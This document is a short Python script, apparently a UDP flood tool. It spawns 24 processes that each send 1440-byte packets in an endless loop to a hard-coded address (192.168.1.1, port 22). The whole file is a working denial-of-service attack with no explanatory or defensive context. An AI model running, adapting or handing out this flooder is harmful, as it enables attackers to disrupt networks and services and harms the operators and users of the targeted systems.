import sys
import socket
import multiprocessing as MP

target = '192.168.1.1'
port = 22
payload = 'x' * 1440
procs = []

def sp():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        if sys.version_info < (3, 0):
            sock.sendto(payload, (target, port))
        elif sys.version_info > (3, 0):
            sock.sendto(bytes(payload, "utf-8"), (target, port))

if __name__ == "__main__":
    for a in range(24):
        p = MP.Process(target=sp)
        p.start()
        procs.append(p)

    for x in procs:
        x.join()
